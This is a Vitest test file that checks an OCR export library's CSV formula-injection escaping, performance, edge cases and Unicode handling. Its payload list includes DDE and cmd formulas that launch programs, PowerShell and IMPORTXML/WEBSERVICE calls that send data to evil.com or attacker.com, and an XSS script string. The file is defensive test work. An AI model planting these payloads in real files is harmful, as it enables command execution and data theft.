/**
 * frontend/src/__tests__/lib/challenger_m6_adversarial.test.ts
 * Milestone 6 Challenger Adversarial Stress Test Suite.
 * Rigorously stress tests:
 * 1. CWE-1236 CSV Formula Injection defense with advanced payloads and RFC-4180 parsing
 * 2. High-throughput export scaling (10,000 tokens) with latency SLA assertions
 * 3. Degenerate, null, undefined, and non-conforming document object handling
 * 4. Multilingual Unicode, diacritics, bidirectional scripts, and XSS injection containment
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  exportDocumentAsJson,
  exportDocumentAsTxt,
  exportDocumentAsCsv,
  copyTextToClipboard,
  downloadFile,
} from '@/lib/exportUtils';
import { DocumentOCRResult, PageOCRResult, LineOCRResult, WordOCRResult } from '@/types/ocr';

describe('Milestone 6 Challenger Adversarial Suite', () => {
  // Comprehensive attack vector dictionary for spreadsheet formula injection (CWE-1236)
  const ADVANCED_CWE_PAYLOADS = [
    { name: 'Direct Calc Command', payload: `=cmd|'/C calc'!A0` },
    { name: 'PowerShell Execution', payload: `+cmd|' /C powershell.exe -Command "Invoke-WebRequest evil.com"'!A0` },
    { name: 'DDE Server Lookup', payload: `=DDE("cmd";"/C notepad.exe";"__DDE__")` },
    { name: 'Negative Prefix Command', payload: `-2+5*cmd|' /C calc'!A0` },
    { name: 'At-Macro Formula', payload: `@SUM(1+1)*cmd|'/C calc'!A0` },
    { name: 'Remote XML Exfiltration', payload: `@IMPORTXML("http://attacker.com/leak?data="&A1, "//a")` },
    { name: 'Tab-Prepended Formula', payload: `\t=1+1` },
    { name: 'Tab-Prepended Command', payload: `\t+cmd|'/C calc'!A0` },
    { name: 'Carriage-Return Formula', payload: `\r=1+1` },
    { name: 'Carriage-Return Command', payload: `\r@IMPORTXML("http://evil.com","//")` },
    { name: 'Quoted Formula Payload', payload: `"=cmd|'/C calc'!A0"` },
    { name: 'Formula with Internal Semicolons & Quotes', payload: `=HYPERLINK("http://evil.com?id=" & A1; "Click to Update")` },
    { name: 'Arithmetic Prepend (+)', payload: `+1234567890` },
    { name: 'Arithmetic Prepend (-)', payload: `-9876543210` },
    { name: 'Simple Equals (=)', payload: `=100+200` },
    { name: 'Webservice Exfiltration', payload: `=WEBSERVICE("http://evil.com/leak")` },
  ];

  describe('1. CWE-1236 Formula Injection Neutralization & RFC-4180 Integrity', () => {
    ADVANCED_CWE_PAYLOADS.forEach(({ name, payload }) => {
      it(`sanitizes ${name}: ${JSON.stringify(payload)} in CSV export`, () => {
        const testDoc: DocumentOCRResult = {
          document_id: 'doc_cwe_challenger',
          filename: 'challenger_payload.png',
          total_pages: 1,
          mean_confidence: 0.95,
          processing_time_ms: 15,
          full_text: payload,
          pages: [
            {
              page_number: 1,
              width: 1000,
              height: 1000,
              mean_confidence: 0.95,
              full_text: payload,
              lines: [
                {
                  line_id: `line_${payload}`,
                  line_number: 1,
                  text: payload,
                  original_text: payload,
                  confidence: 0.95,
                  bbox: [0.1, 0.1, 0.2, 0.9],
                  words: [
                    {
                      word_id: `word_${payload}`,
                      text: payload,
                      original_text: payload,
                      confidence: 0.95,
                      bbox: [0.1, 0.1, 0.2, 0.5],
                    },
                  ],
                },
              ],
            },
          ],
        };

        const csv = exportDocumentAsCsv(testDoc);
        const rows = csv.split('\n');
        expect(rows.length).toBe(2);

        const dataRow = rows[1];
        const isDangerous = /^[=+\-@\t\r]/.test(payload);

        if (isDangerous) {
          // If the payload starts with dangerous characters, it MUST be escaped with a leading single quote (')
          expect(dataRow).toContain(`"\'`);
        }

        // Double quotes must be escaped per RFC-4180
        const expectedEscaped = payload.replace(/"/g, '""');
        if (isDangerous) {
          expect(dataRow).toContain(`"\'${expectedEscaped}"`);
        } else {
          expect(dataRow).toContain(`"${expectedEscaped}"`);
        }
      });
    });

    it('preserves clean clinical terms without unnecessary single quote prepending', () => {
      const clinicalTerms = [
        'Amoxicillin 500mg PO TID x10d',
        'Lisinopril 10mg PO daily',
        'Metformin HCl 850mg BID',
        'Atorvastatin 40mg PO QHS',
        'Levothyroxine 50mcg PO QAM',
        'Hydrochlorothiazide 25mg daily',
      ];

      const cleanDoc: DocumentOCRResult = {
        document_id: 'doc_clean_clinical',
        filename: 'clean_rx.png',
        total_pages: 1,
        mean_confidence: 0.99,
        processing_time_ms: 20,
        full_text: clinicalTerms.join('\n'),
        pages: [
          {
            page_number: 1,
            width: 1200,
            height: 1600,
            mean_confidence: 0.99,
            full_text: clinicalTerms.join('\n'),
            lines: clinicalTerms.map((term, idx) => ({
              line_id: `l_${idx + 1}`,
              line_number: idx + 1,
              text: term,
              original_text: term,
              confidence: 0.99,
              bbox: [0.1 + idx * 0.1, 0.1, 0.18 + idx * 0.1, 0.9],
              words: term.split(' ').map((w, wIdx) => ({
                word_id: `l_${idx + 1}_w_${wIdx + 1}`,
                text: w,
                original_text: w,
                confidence: 0.99,
                bbox: [0.1 + idx * 0.1, 0.1 + wIdx * 0.15, 0.18 + idx * 0.1, 0.22 + wIdx * 0.15],
              })),
            })),
          },
        ],
      };

      const csv = exportDocumentAsCsv(cleanDoc);
      // Clean terms should NOT have single quote prefix
      expect(csv).toContain('"Amoxicillin"');
      expect(csv).not.toContain('"\'Amoxicillin"');
      expect(csv).toContain('"Lisinopril"');
      expect(csv).not.toContain('"\'Lisinopril"');
    });
  });

  describe('2. Massive Document Export Scaling & Performance Benchmark (10,000 Tokens)', () => {
    it('serializes 10,000 word tokens into JSON, TXT, and CSV within 300ms SLA', () => {
      const pageCount = 20;
      const linesPerPage = 25;
      const wordsPerLine = 20; // 20 * 25 * 20 = 10,000 tokens

      const pages: PageOCRResult[] = [];
      for (let p = 1; p <= pageCount; p++) {
        const lines: LineOCRResult[] = [];
        for (let l = 1; l <= linesPerPage; l++) {
          const words: WordOCRResult[] = [];
          for (let w = 1; w <= wordsPerLine; w++) {
            words.push({
              word_id: `p${p}_l${l}_w${w}`,
              text: `Token_${p}_${l}_${w}`,
              original_text: `Token_${p}_${l}_${w}`,
              confidence: 0.95,
              bbox: [0.1, 0.1, 0.2, 0.2],
            });
          }
          lines.push({
            line_id: `p${p}_l${l}`,
            line_number: l,
            text: words.map((w) => w.text).join(' '),
            original_text: words.map((w) => w.text).join(' '),
            confidence: 0.95,
            bbox: [0.1, 0.1, 0.2, 0.9],
            words,
          });
        }
        pages.push({
          page_number: p,
          width: 1200,
          height: 1600,
          mean_confidence: 0.95,
          full_text: lines.map((l) => l.text).join('\n'),
          lines,
        });
      }

      const massiveDoc: DocumentOCRResult = {
        document_id: 'doc_massive_10k_tokens',
        filename: 'massive_patient_record.pdf',
        total_pages: pageCount,
        mean_confidence: 0.95,
        processing_time_ms: 1250,
        full_text: pages.map((p) => p.full_text).join('\n\n'),
        pages,
      };

      // 1. JSON Benchmark
      const t0_json = performance.now();
      const jsonStr = exportDocumentAsJson(massiveDoc);
      const jsonElapsed = performance.now() - t0_json;
      expect(jsonElapsed).toBeLessThan(300);
      expect(jsonStr.length).toBeGreaterThan(1_000_000);

      // 2. TXT Benchmark
      const t0_txt = performance.now();
      const txtStr = exportDocumentAsTxt(massiveDoc);
      const txtElapsed = performance.now() - t0_txt;
      expect(txtElapsed).toBeLessThan(100);
      expect(txtStr.split('--- PAGE BREAK ---').length).toBe(pageCount);

      // 3. CSV Benchmark
      const t0_csv = performance.now();
      const csvStr = exportDocumentAsCsv(massiveDoc);
      const csvElapsed = performance.now() - t0_csv;
      expect(csvElapsed).toBeLessThan(300);
      const csvLines = csvStr.split('\n');
      // 1 header + 10,000 word rows = 10,001 rows
      expect(csvLines.length).toBe(10001);
    });
  });

  describe('3. Degenerate Structures & Edge Case Resilience', () => {
    it('gracefully handles documents with empty pages array or zero lines', () => {
      const emptyDoc: DocumentOCRResult = {
        document_id: 'doc_zero',
        filename: 'empty.png',
        total_pages: 0,
        mean_confidence: 0,
        processing_time_ms: 0,
        full_text: '',
        pages: [],
      };

      expect(() => exportDocumentAsJson(emptyDoc)).not.toThrow();
      expect(() => exportDocumentAsTxt(emptyDoc)).not.toThrow();
      expect(() => exportDocumentAsCsv(emptyDoc)).not.toThrow();

      const csv = exportDocumentAsCsv(emptyDoc);
      expect(csv.trim()).toBe('page,line_number,line_id,word_id,confidence,text,original_text,is_edited,ymin,xmin,ymax,xmax');
    });

    it('handles lines with unsegmented word lists without throwing', () => {
      const unsegmentedDoc: DocumentOCRResult = {
        document_id: 'doc_unseg',
        filename: 'unseg.png',
        total_pages: 1,
        mean_confidence: 0.9,
        processing_time_ms: 10,
        full_text: 'Full line unsegmented text',
        pages: [
          {
            page_number: 1,
            width: 800,
            height: 1000,
            mean_confidence: 0.9,
            full_text: 'Full line unsegmented text',
            lines: [
              {
                line_id: 'l1',
                line_number: 1,
                text: 'Full line unsegmented text',
                confidence: 0.9,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [], // No words segmented
              },
            ],
          },
        ],
      };

      const csv = exportDocumentAsCsv(unsegmentedDoc);
      const rows = csv.split('\n');
      expect(rows.length).toBe(2);
      expect(rows[1]).toContain('"Full line unsegmented text"');
    });

    it('safely handles missing optional fields (original_text, line_number, is_edited)', () => {
      const minimalDoc: DocumentOCRResult = {
        document_id: 'doc_min',
        filename: 'min.png',
        total_pages: 1,
        mean_confidence: 0.85,
        processing_time_ms: 5,
        full_text: 'Minimal text',
        pages: [
          {
            page_number: 1,
            width: 600,
            height: 800,
            mean_confidence: 0.85,
            full_text: 'Minimal text',
            lines: [
              {
                line_id: 'l_min',
                text: 'Minimal text',
                confidence: 0.85,
                bbox: [0.1, 0.1, 0.2, 0.5],
                words: [
                  {
                    word_id: 'w_min',
                    text: 'Minimal',
                    confidence: 0.85,
                    bbox: [0.1, 0.1, 0.2, 0.3],
                  },
                ],
              },
            ],
          },
        ],
      };

      const jsonStr = exportDocumentAsJson(minimalDoc);
      const parsed = JSON.parse(jsonStr);
      expect(parsed.pages[0].lines[0].original_text).toBe('Minimal text');
      expect(parsed.pages[0].lines[0].is_edited).toBe(false);

      const csv = exportDocumentAsCsv(minimalDoc);
      expect(csv).toContain('"Minimal"');
      expect(csv).toContain('FALSE');
    });
  });

  describe('4. Multilingual Unicode, Diacritics & XSS Neutralization', () => {
    it('preserves complex UTF-8 characters, RTL scripts, and emojis in all exports', () => {
      const unicodeLines = [
        'Rx: ℞ 500mg ± 5% — 20µg/mL',
        'مرحبا بالعالم — שלום עולם',
        'Café, façade, naïve & crème brûlée',
        'Take 💊 2x daily ⏰ with water 💧',
      ];

      const unicodeDoc: DocumentOCRResult = {
        document_id: 'doc_unicode_challenger',
        filename: 'unicode_rx.png',
        total_pages: 1,
        mean_confidence: 0.98,
        processing_time_ms: 25,
        full_text: unicodeLines.join('\n'),
        pages: [
          {
            page_number: 1,
            width: 1000,
            height: 1200,
            mean_confidence: 0.98,
            full_text: unicodeLines.join('\n'),
            lines: unicodeLines.map((txt, idx) => ({
              line_id: `u_${idx}`,
              line_number: idx + 1,
              text: txt,
              confidence: 0.98,
              bbox: [0.1 + idx * 0.1, 0.1, 0.18 + idx * 0.1, 0.9],
              words: txt.split(' ').map((w, wIdx) => ({
                word_id: `u_${idx}_w_${wIdx}`,
                text: w,
                confidence: 0.98,
                bbox: [0.1 + idx * 0.1, 0.1 + wIdx * 0.1, 0.18 + idx * 0.1, 0.18 + wIdx * 0.1],
              })),
            })),
          },
        ],
      };

      const jsonStr = exportDocumentAsJson(unicodeDoc);
      expect(jsonStr).toContain('℞ 500mg');
      expect(jsonStr).toContain('مرحبا بالعالم');
      expect(jsonStr).toContain('💊');

      const txt = exportDocumentAsTxt(unicodeDoc);
      expect(txt).toContain('crème brûlée');
      expect(txt).toContain('שלום עולם');

      const csv = exportDocumentAsCsv(unicodeDoc);
      expect(csv).toContain('℞');
      expect(csv).toContain('💊');
    });

    it('preserves HTML and script tags verbatim in data exports without script execution', () => {
      const xssScript = '<script>alert("ChallengerXSS")</script>';
      const xssDoc: DocumentOCRResult = {
        document_id: 'doc_xss',
        filename: 'xss.png',
        total_pages: 1,
        mean_confidence: 0.95,
        processing_time_ms: 10,
        full_text: xssScript,
        pages: [
          {
            page_number: 1,
            width: 800,
            height: 600,
            mean_confidence: 0.95,
            full_text: xssScript,
            lines: [
              {
                line_id: 'l_xss',
                text: xssScript,
                confidence: 0.95,
                bbox: [0.1, 0.1, 0.2, 0.8],
                words: [
                  {
                    word_id: 'w_xss',
                    text: xssScript,
                    confidence: 0.95,
                    bbox: [0.1, 0.1, 0.2, 0.8],
                  },
                ],
              },
            ],
          },
        ],
      };

      const json = exportDocumentAsJson(xssDoc);
      expect(json).toContain('<script>alert(\\"ChallengerXSS\\")<\\/script>'.replace('\\/', '/'));

      const csv = exportDocumentAsCsv(xssDoc);
      expect(csv).toContain(`"<script>alert(""ChallengerXSS"")</script>"`);
    });
  });
});
